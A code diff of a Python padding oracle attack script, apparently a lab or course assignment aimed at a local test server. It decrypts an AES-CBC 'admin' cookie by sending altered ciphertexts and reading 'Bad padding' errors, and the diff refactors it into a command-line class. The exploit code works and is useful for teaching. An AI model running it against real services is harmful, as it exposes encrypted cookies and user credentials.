@@ -1,110 +1,76 @@
-import os
-from cryptography.hazmat.primitives import hashes, padding, ciphers
-from cryptography.hazmat.backends import default_backend
-
-# fix error when running
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.primitives import ciphers
+from requests import Session
+import os
 
-# import base64
-# import binascii
-
-from requests import codes, Session
-
-LOGIN_FORM_URL = "http://localhost:8080/login"
-
-def do_login_form(sess, username,password):
-	data_dict = {"username":username,\
-			"password":password,\
-			"login":"Login"
-			}
-	response = sess.post(LOGIN_FORM_URL,data_dict)
-	return response.status_code == codes.ok
-
-#You should implement this padding oracle object
-#to craft the requests containing the mauled
-#ciphertexts to the right URL.
-class PaddingOracle(object):
-
+class PaddingOracleAttack:
     def __init__(self, po_url):
+        self.session = Session()
         self.url = po_url
-        self._block_size_bytes = int(ciphers.algorithms.AES.block_size/8)
+        self._block_size_bytes = ciphers.algorithms.AES.block_size / 8
 
     @property
     def block_length(self):
-        return self._block_size_bytes
+        return int(self._block_size_bytes)
 
-    #you'll need to send the provided ciphertext
-    #as the admin cookie, retrieve the request,
-    #and see whether there was a padding error or not.
-    def test_ciphertext(self, ct, sess):
-        response = sess.post(self.url, {}, cookies={'admin': ct}).text
-        if 'Unspecified error' in response:
-            return -1
-        elif 'Bad padding' in response:
-            return 0
-        else:
-            return 1
+    def do_login_form(self, username, password):
+        login_url = "http://localhost:8080/login"
+        data_dict = {"username": username, "password": password, "login": "Login"}
+        response = self.session.post(login_url, data_dict)
+        return response.ok
 
-def split_into_blocks(msg, l):
-    while msg:
-        print(msg)
-        yield msg[:l]
-        msg = msg[l:]
-    
-def po_attack_2blocks(po, ctx, sess):
-    """Given two blocks of cipher texts, it can recover the first block of
-    the message.
-    @po: an instance of padding oracle. 
-    @ctx: a ciphertext 
-    """
-    assert len(ctx) == 2*po.block_length, "This function only accepts 2 block "\
-        "cipher texts. Got {} block(s)!".format(len(ctx)/po.block_length)
-    c0, c1 = list(split_into_blocks(ctx, po.block_length))
-    msg = ''
-    # TODO: Implement padding oracle attack for 2 blocks of messages.
-    decoded = [0] * po.block_length
+    def is_valid_padding(self, ciphertext):
+        response = self.session.post(self.url, cookies={'admin': ciphertext.hex()})
+        if 'Bad padding' in response.text:
+            return False
+        return True
 
-    for j in range(1, 17):
-        i = po.block_length - j
+    def remove_pkcs7_padding(self, data):
+        padding_len = data[-1]
+        if padding_len < 1 or padding_len > self.block_length:
+            raise ValueError("Invalid PKCS#7 padding.")
+        for byte in data[-padding_len:]:
+            if byte != padding_len:
+                raise ValueError("Invalid PKCS#7 padding.")
+        return data[:-padding_len]
 
-        for n in range(0, 256):
-            bytes_array = bytearray(c0[:i])
-            bytes_array.append(n ^ c0[i])
-            bytes_array.extend([j ^ v for v in decoded[i+1:]])
+    def po_attack(self, encrypted_cookie):
+        encrypted_cookie_bytes = bytes.fromhex(encrypted_cookie)
+        decrypted_message = b""
 
-            mauled = bytes(bytes_array)
-            ct = (b'\x00' * 16 + mauled + c1).hex() if i == 0 else (mauled + c1).hex() 
-            
-            if po.test_ciphertext(ct, sess) == 1:
-                    decoded[i] = n ^ c0[i] ^ j
+        blocks = [encrypted_cookie_bytes[i:i+self.block_length] for i in range(0, len(encrypted_cookie_bytes), self.block_length)]
 
-    msg = ''.join([chr(v1 ^ v2) for v1, v2 in zip(c0, decoded)])
-    return msg
+        for i in range(len(blocks) - 1):
+            decrypted_block = self.po_attack_2blocks(blocks[i], blocks[i+1])
+            decrypted_message += decrypted_block
 
-def po_attack(po, ctx):
-    """
-    Padding oracle attack that can decrpyt any arbitrary length messags.
-    @po: an instance of padding oracle. 
-    You don't have to unpad the message.
-    """
-    ctx_blocks = list(split_into_blocks(ctx, po.block_length))
-    nblocks = len(ctx_blocks)
-    # TODO: Implement padding oracle attack for arbitrary length message.
-    sess = Session()
-    assert(do_login_form(sess, "attacker", "attacker"))
+        return self.remove_pkcs7_padding(decrypted_message)
 
-    decoded = ''
-    for i in range(nblocks-1):
-        decoded += po_attack_2blocks(po, ctx_blocks[i] + ctx_blocks[i+1], sess)
+    def po_attack_2blocks(self, previous_block, current_block):
+        decrypted_block = b""
+        intermediate_state = [0] * self.block_length
 
-    return decoded
+        for byte_index in range(self.block_length - 1, -1, -1):
+            padding_byte = self.block_length - byte_index
+            for guess in range(256):
+                prefix = b"\x00" * byte_index
+                padding = bytes([padding_byte ^ val for val in intermediate_state[byte_index + 1:]])
+                attack_block = prefix + bytes([guess]) + padding
+                if self.is_valid_padding(attack_block + current_block):
+                    intermediate_state[byte_index] = guess ^ padding_byte
+                    decrypted_block = bytes([previous_block[byte_index] ^ intermediate_state[byte_index]]) + decrypted_block
+                    break
 
-if __name__=="__main__":
-    po = PaddingOracle("http://localhost:8080/setcoins")
-    
-    pwd = po_attack(
-        po,
-        bytes.fromhex("e9fae094f9c779893e11833691b6a0cd3a161457fa8090a7a789054547195e606035577aaa2c57ddc937af6fa82c013d")
-    )
-    print('test')
-    print("password: " + pwd)
+        return decrypted_block
+
+if __name__ == "__main__":
+    if len(os.sys.argv) != 2:
+        print("Usage: python3 poattack.py <cookie>")
+        exit(1)
+    attacker = PaddingOracleAttack("http://localhost:8080/setcoins")
+    if attacker.do_login_form("attacker", "attacker"):
+        encrypted_cookie = os.sys.argv[1]
+        decrypted_password = attacker.po_attack(encrypted_cookie)
+        print("Decrypted password:", decrypted_password.decode('utf-8'))
+    else:
+        print("Login failed.")
